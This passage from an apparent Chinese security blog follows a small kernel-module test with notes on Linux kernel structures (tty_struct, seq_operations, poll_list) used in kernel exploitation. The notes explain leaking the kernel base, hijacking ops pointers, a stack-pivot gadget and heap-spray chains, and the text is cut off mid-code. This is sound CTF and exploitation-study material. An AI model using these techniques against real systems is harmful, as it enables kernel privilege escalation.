class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> &amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="验证">验证</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # insmod myko.ko </span><br><span class="line">[   17.837662] myko: loading out-of-tree module taints kernel.</span><br><span class="line">[   17.840020] myko: module verification failed: signature and/or required key l</span><br><span class="line">/ # [   17.887877] random: fast init done</span><br><span class="line">/ # lsmod</span><br><span class="line">myko 16384 0 - Live 0xffffffffc002e000 (OE)</span><br><span class="line">/ # mknod /dev/myko c 230 0 #创建设备节点，c表明是字符设备，230是主设备号，0是次设备号</span><br><span class="line">/ # chmod 777 /dev/myko </span><br><span class="line">/ # echo &quot;hello,world!&quot; &gt; /dev/myko </span><br><span class="line">[  103.447740] [+] Written 13 bytes(s) from 13</span><br><span class="line">/ # cat dev/myko </span><br><span class="line">[  111.699740] [+] Read 4096 bytes(s) from 4096</span><br><span class="line">hello,world!</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux kernel pwn 常用结构体</title>
    <url>/2024/11/08/linux-kernel-pwn-useful-structs/</url>
    <content><![CDATA[<h1 id="tty-设备结构体">tty 设备结构体</h1>
<p>tty 设备在 <code>/dev</code> 下的一个伪终端设备 <code>ptmx</code>
。</p>
<h2 id="tty_structkmalloc-1k-gfp_kernel_account">tty_struct（kmalloc-1k
| GFP_KERNEL_ACCOUNT）</h2>
<p><code>tty_struct</code> 定义如下 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配释放">分配/释放</h3>
<p>在 <code>alloc_tty_struct</code> 函数中进行 <code>tty_struct</code>
的分配。</p>
<p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> tty_struct *<span class="title function_">alloc_tty_struct</span><span class="params">(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">	tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!tty)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></div></p>
<p>通常情况下我们选择打开 <code>/dev/ptmx</code> 来在内核中分配一个
<code>tty_struct</code>
结构体，相应地当我们将其关闭时该结构体便会被释放回 slab/slub 中。</p>
<h3 id="魔数">魔数</h3>
<p>tty_struct 的魔数为
<code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体</p>
<h2 id="tty_operations">tty_operations</h2>
<p>内核中 tty 设备的 ops 函数表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<h3 id="数据泄露">数据泄露</h3>
<p><code>tty_operations</code> 在内核中的数据段，通过 uaf + tty 堆喷泄露
<code>tty_struct</code> 中的 <code>ops</code> 指针即可泄露内核基址。</p>
<h3 id="劫持内核执行流">劫持内核执行流</h3>
<p>与 glibc 中的 vtable 攻击类似，通过劫持 <code>tty_struct</code> 中的
<code>ops</code> 指针到伪造的 <code>tty_operations</code>
。劫持控制流时，通常第一个参数为 <code>tty_struct</code> 结构体地址，即
<code>rdi</code> 指向 <code>tty_struct</code> 结构体，可以通过 gadget
将栈迁移至 <code>tty_struct</code> 结构体。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF81238D50 push    rdi</span><br><span class="line">.text:FFFFFFFF81238D51 pop     rsp</span><br><span class="line">.text:FFFFFFFF81238D52 pop     rbp</span><br><span class="line">.text:FFFFFFFF81238D53 add     rax, rdx</span><br><span class="line">.text:FFFFFFFF81238D56 retn</span><br></pre></td></tr></table></figure></div> 或者利用
<code>work_for_cpu</code> 函数完成函数调用传参和保存返回值。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="type">size_t</span> *args)</span> &#123;</span><br><span class="line">    args[<span class="number">6</span>] = ((__int64 (__fastcall *)(<span class="type">size_t</span>))args[<span class="number">4</span>])(args[<span class="number">5</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## tty_file_private (kmalloc-32 | GFP_KERNEL)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配释放-1">分配/释放</h3>
<p>打开 <code>/dev/ptmx</code> 时会分配 <code>tty_file_private</code>
并且该结构体的 <code>tty</code> 指针会指向 <code>tty_struct</code>
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tty_alloc_file</span><span class="params">(<span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">priv</span>;</span></span><br><span class="line"></span><br><span class="line">	priv = kmalloc(<span class="keyword">sizeof</span>(*priv), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!priv)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	file-&gt;private_data = priv;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Associate a new file with the tty structure */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tty_add_file</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">priv</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">	priv-&gt;tty = tty;</span><br><span class="line">	priv-&gt;file = file;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;tty-&gt;files_lock);</span><br><span class="line">	list_add(&amp;priv-&gt;<span class="built_in">list</span>, &amp;tty-&gt;tty_files);</span><br><span class="line">	spin_unlock(&amp;tty-&gt;files_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ptmx_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	retval = tty_alloc_file(filp);</span><br><span class="line">    ...</span><br><span class="line">	tty = tty_init_dev(ptm_driver, index);</span><br><span class="line">    ...</span><br><span class="line">	tty_add_file(tty, filp);</span><br><span class="line">    ...</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure></div>
<p>相应的，当关闭打开的 <code>/dev/ptmx</code> 时会释放相应结构。</p>
<h3 id="数据泄露-1">数据泄露</h3>
<p>读取 <code>tty_file_private</code> 可以泄露对应的
<code>tty_struct</code> 地址，也就是一个 kmalloc-1k 的 object
的地址，之后我们可以通过释放 <code>tty_struct</code> +
<code>pipe_buffer</code> 堆喷 + <code>poll_list</code> 任意地址释放 +
<code>user_key_payload</code> 劫持修改的方式劫持控制流提权。 # seq_file
相关</p>
<p><strong>序列文件接口</strong>（Sequence File Interface）是针对 procfs
默认操作函数每次只能读取一页数据从而难以处理较大 proc
文件的情况下出现的，其为内核编程提供了更为友好的接口。</p>
<h2 id="seq_file">seq_file</h2>
<p>为了简化操作，在内核 <code>seq_file</code> 系列接口中为 file
结构体提供了 private data 成员 <code>seq_file</code>
结构体，该结构体定义于 <code>/include/linux/seq_file.h</code>
当中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> from;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">size_t</span> pad_until;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">loff_t</span> read_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="type">int</span> poll_event;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>seq_file</code> 在 <code>seq_open</code>
时被分配，但是由于从单独的 <code>seq_file_cache</code>
中分配，因此很难利用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">seq_file_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	seq_file_cache = KMEM_CACHE(seq_file, SLAB_ACCOUNT|SLAB_PANIC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="keyword">struct</span> seq_operations *op)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	p = kmem_cache_zalloc(seq_file_cache, GFP_KERNEL);</span><br></pre></td></tr></table></figure></div>
<h2
id="seq_operationskmalloc-32-gfp_kernel_account">seq_operations（kmalloc-32
| GFP_KERNEL_ACCOUNT）</h2>
<p>该结构体定义于 <code>/include/linux/seq_file.h</code>
当中，只定义了四个函数指针，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配释放-2">分配/释放</h3>
<p><code>seq_operations</code> 分配过程存在如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">stat_open()        &lt;--- stat_proc_ops.proc_open</span><br><span class="line">    single_open_size()</span><br><span class="line">        single_open()</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>single_open</code> 函数定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        <span class="keyword">if</span> (!res)</span><br><span class="line">            ((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(single_open);</span><br></pre></td></tr></table></figure></div>
<p>注意到 <code>stat_open()</code> 为 procfs 中的 <code>stat</code>
文件对应的 <code>proc_ops</code> 函数表中 <code>open</code>
函数对应的默认函数指针，在内核源码 <code>fs/proc/stat.c</code>
中有如下定义：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">stat_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_flags    = PROC_ENTRY_PERMANENT,</span><br><span class="line">    .proc_open    = stat_open,</span><br><span class="line">    .proc_read_iter    = seq_read_iter,</span><br><span class="line">    .proc_lseek    = seq_lseek,</span><br><span class="line">    .proc_release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">proc_stat_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;stat&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;stat_proc_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">fs_initcall(proc_stat_init);</span><br></pre></td></tr></table></figure></div>
<p>即该文件对应的是 <code>/proc/id/stat</code> 文件，那么只要我们打开
<code>proc/self/stat</code> 文件便能分配到新的
<code>seq_operations</code> 结构体。</p>
<p>对应地，在定义于 <code>fs/seq_file.c</code> 中的
<code>single_release()</code> 为 <code>stat</code> 文件的
<code>proc_ops</code> 的默认 <code>release</code> 指针，其会释放掉对应的
<code>seq_operations</code>
结构体，故我们只需要关闭文件即可释放该结构体。</p>
<h3 id="数据泄露-2">数据泄露</h3>
<p>通过泄露 <code>seq_operations</code>
结构体的内容可以泄露内核基址。</p>
<h3 id="劫持内核执行流-1">劫持内核执行流</h3>
<p>当我们 <code>read</code> 一个 <code>stat</code> 文件时，内核会调用其
<code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，其默认值为
<code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code>
中，注意到有如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p>即其会调用 seq_operations 中的 start
函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start
后再读取对应 stat 文件便能控制内核执行流</strong> 。</p>
<p>由于劫持控制流后参数不容易控制，因此这个方法通常只在早期版本的内核中栈迁移到
<code>pt_regs</code> 上利用。 # poll 系统调用</p>
<h2 id="poll_list-kmalloc-32-4k-gfp_kernel">poll_list (kmalloc-(32-4k) |
GFP_KERNEL)</h2>
<p><code>poll_list</code> 对象是在调用 <code>poll()</code>
时分配，该调用可以监视 1 个或多个文件描述符的活动。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">short</span> events;</span><br><span class="line">	<span class="type">short</span> revents;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>poll_list</code> 结构如下图所示，前 30 个 <code>poll_fd</code>
在栈上，后面的都在堆上，最多 510 个 <code>poll_fd</code> 在一个堆上的
<code>poll_list</code> 上，堆上的 <code>poll_list</code> 最大为 0x1000
。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b4829bf55668e513c31f40e641cae294.png"
                     
alt="在这里插入图片描述" 
                > ### 分配/释放</p>
<p><code>do_sys_poll</code> 函数完成 <code>poll_list</code>
的分配和释放。</p>
<p><strong><code>poll_list</code> 的是超时自动释放的，我们可以指定
<code>poll_list</code> 的释放时间。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_STACK_ALLOC	256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))	<span class="comment">//(4096-16)/8 = 510(堆上存放pollfd最大数量)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \				<span class="comment">//(256-16)/8 = 30 (栈上存放pollfd最大数量)</span></span></span><br><span class="line">			<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd))</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_sys_poll</span><span class="params">(<span class="keyword">struct</span> pollfd __user *ufds, <span class="type">unsigned</span> <span class="type">int</span> nfds,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> timespec64 *end_time)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_wqueues</span> <span class="title">table</span>;</span></span><br><span class="line">    <span class="type">int</span> err = -EFAULT, fdcount, len;</span><br><span class="line">    <span class="comment">/* Allocate small arguments on the stack to save memory and be</span></span><br><span class="line"><span class="comment">       faster - use long to make sure the buffer is aligned properly</span></span><br><span class="line"><span class="comment">       on 64 bit archs to avoid unaligned access */</span></span><br><span class="line">    <span class="type">long</span> stack_pps[POLL_STACK_ALLOC/<span class="keyword">sizeof</span>(<span class="type">long</span>)]; <span class="comment">// [1] stack_pps 256 字节的栈缓冲区, 负责存储前 30 个 pollfd entry</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">const</span> <span class="title">head</span> =</span> (<span class="keyword">struct</span> poll_list *)stack_pps;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">walk</span> =</span> head;</span><br><span class="line"> 	<span class="type">unsigned</span> <span class="type">long</span> todo = nfds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nfds &gt; rlimit(RLIMIT_NOFILE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	len = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, nfds, N_STACK_PPS); <span class="comment">// [2] 前30个 pollfd entry 先存放在栈上，节省内存和时间</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		walk-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		walk-&gt;len = len;</span><br><span class="line">		<span class="keyword">if</span> (!len)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(walk-&gt;entries, ufds + nfds-todo,</span><br><span class="line">					<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) * walk-&gt;len))</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">		todo -= walk-&gt;len;</span><br><span class="line">		<span class="keyword">if</span> (!todo)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		len = min(todo, POLLFD_PER_PAGE); 		<span class="comment">// [3] 如果提交超过30个 pollfd entries，就会把多出来的 pollfd 放在内核堆上。每个page 最多存 POLLFD_PER_PAGE (510) 个entry, 超过这个数，则分配新的 poll_list, 依次循环直到存下所有传入的 entry</span></span><br><span class="line">		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len),</span><br><span class="line">					    GFP_KERNEL); 			<span class="comment">// [4] 只要控制好被监控的文件描述符数量，就能控制分配size，从 kmalloc-32 到 kmalloc-4k</span></span><br><span class="line">		<span class="keyword">if</span> (!walk) &#123;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	poll_initwait(&amp;table);</span><br><span class="line">	fdcount = do_poll(head, &amp;table, end_time);  <span class="comment">// [5] 分配完 poll_list 对象后，调用 do_poll() 来监控这些文件描述符，直到发生特定 event 或者超时。这里 end_time 就是最初传给 poll() 的超时变量, 这表示 poll_list 对象可以在内存中保存任意时长，超时后自动释放。</span></span><br><span class="line">	poll_freewait(&amp;table);</span><br><span class="line"></span><br><span 